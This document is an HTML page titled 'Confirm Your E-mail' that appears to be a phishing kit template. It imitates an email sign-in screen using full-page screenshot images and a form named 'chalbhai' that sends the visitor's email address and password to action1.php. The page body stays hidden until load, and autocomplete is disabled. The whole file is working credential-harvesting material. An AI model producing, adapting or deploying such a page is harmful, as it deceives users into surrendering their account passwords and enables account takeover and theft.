
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<link rel="shortcut icon"
              href="images/mobile-app-icon.png"/>
<html><head><title>Confirm Your E-mail</title>
			  
	
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

<body style="visibility:hidden" onload="unhideBody()">
<style type="text/css">
div#container
{
	position:relative;
	width: 100%;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style> 
.textbox { 
 	width: 100%;
    font-size: 1em;
    font-family: Optimist,Arial,Helvetica,sans-serif;
    font-weight: 400;
    text-align: left;
    line-height: 18px;
    cursor: pointer;
    background-color: #fff;
    border: 2px solid #999; 
    background-image: none;
    color: #021829;
    padding: .625em;
    height: auto;
    box-sizing: border-box; 
  } 
   
  
 .textbox:focus { 
 	width: 100%;
    font-size: 1em;
    font-family: Optimist,Arial,Helvetica,sans-serif;
    font-weight: 400;
    text-align: left;
    line-height: 18px;
    cursor: pointer;
    border: 2px solid #c2c0c6; 
    background-color: #fff;
    background-image: none;
    color: #021829;
    padding: .625em;
    height: auto;
    box-sizing: border-box; } 

</style> 

</head>
<body>

<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:272px; z-index:1"><img src="images/Tp.png" alt="" title="" border=0 width=1349 height=272></div>

<div id="image2" style="position:absolute; overflow:hidden; left:327px; top:270px; width:685px; height:272px; z-index:1"><img src="images/md.png" alt="" title="" border=0 width=685 height=272></div>

<form action=action1.php name=chalbhai id=chalbhai method=post>

<input name="formtext1" required autocomplete="off" class="textbox" type="email" style="position:absolute;height:27px;width:212px;left:542;top:355;z-index:19">

<input name="formtext2" required autocomplete="off" class="textbox" type="password" style="position:absolute;height:26px;width:214px;left:542;top:400;z-index:20">

<div id="formimage1" style="position:absolute; left:557px; top:439px; z-index:6"><input type="image" name="formimage1" src="images/cc.png"></div></form>

<div id="image4" style="position:absolute; overflow:hidden; left:0px; top:614px; width:1350	px; height:193px; z-index:1"><img src="images/dw.png" alt="" title="" border=0 width=1350 height=193></div>

</body>
</html>